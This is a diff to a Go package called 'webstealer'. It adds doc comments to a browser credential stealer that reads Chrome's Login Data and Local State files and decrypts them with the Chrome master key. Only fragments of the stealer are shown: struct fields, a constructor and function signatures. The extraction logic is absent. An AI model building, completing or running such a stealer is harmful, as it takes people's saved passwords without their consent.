@@ -1,3 +1,4 @@
+// Package webstealer extracts credentials from browser storage.
 package webstealer
 
 import (
@@ -15,6 +16,7 @@ import (
 	"github.com/kahlys/codex/go/cmd/oracle/internal/osx"
 )
 
+// ChromeStealer reads and decrypts credentials stored by Chrome.
 type ChromeStealer struct {
 	loginDataPath  string
 	localStatePath string // json file where chrome stores master key
@@ -22,6 +24,7 @@ type ChromeStealer struct {
 	masterKey []byte // master key compatible with chrome version 80 or higher
 }
 
+// NewChromeStealer builds a ChromeStealer using default profile paths.
 func NewChromeStealer() ChromeStealer {
 	userProfile := os.Getenv("USERPROFILE")
 
@@ -75,6 +78,7 @@ func chromeMasterKey(localStatePath string) ([]byte, error) {
 	return masterKey, nil
 }
 
+// Run extracts stored Chrome credentials.
 func (cs ChromeStealer) Run() (Results, error) {
 	res := Results{}
 
